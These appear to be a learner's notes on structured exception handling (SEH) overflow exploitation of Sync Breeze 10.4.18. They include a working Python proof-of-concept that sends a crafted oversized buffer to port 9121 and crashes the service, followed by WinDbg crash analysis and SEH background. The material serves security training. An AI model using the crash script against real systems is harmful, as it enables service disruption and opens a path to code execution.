#### Structured Exception Handling (SEH)

As opposed to classic buffer overflows, there are avenues to exploit other structures and pointer to get code execution.

An example being the Windows exception-handling structure, which can be demonstrated in 10.4.18 of Sync Breeze

1. Crash the Application 
2. Control EIP 
3. Make Space for Shellcode 
4. Check Bad Characters 
5. Find a Return Instruction 
6. Jump to ESP 
7. Generate Shellcode

## Crash the Application
Provided POC script: crafts a custom protocol header with a large buffer
```
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * size

  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")

```
- Attach Windbg on Sync Breeze in the VM and run the script
- The process crashes and we see an access violation, EAX has been overwritten as `eax=41414141`. The program tries to deference a pointer value from the EAX register and crashes

## Analyzing the Crash
- The program tries to reach a location at offset 0x24 from the EAX, which is out of program memory, `call dword ptr [eax+24h]`
- EIP is still not overflowed, but if we print the values on the stack with `dds esp L30`, we see that some values did make it, just not quite to EIP.
- press g, and we get a new crash, which show EIP has been overflowed
- The first error handler was a 'first chance exception' which is a notification that an unexpected event occurred during execution

## Intro to SEH
**Hardware exceptions** are initiated by the CPU. We encountered a typical hardware exception when our script crashed the Sync Breeze service as the CPU attempted to dereference an invalid memory address.

**Software exceptions** are explicitly initiated by applications when the execution flow reaches unexpected or unwanted conditions. For example, a software developer raises an exception (try/except) in their code to signal a function could not execute normally because of an invalid input argument.

> A software exception raised in code will leverage the SEH (Structure Exception Handling) mechanism in Windows OS.

Structured exception handling works on a per-thread level, and each thread is identified by the Thread Environment Block (TEB) which stores info related to each thread.

...

`dt nt!_TEB`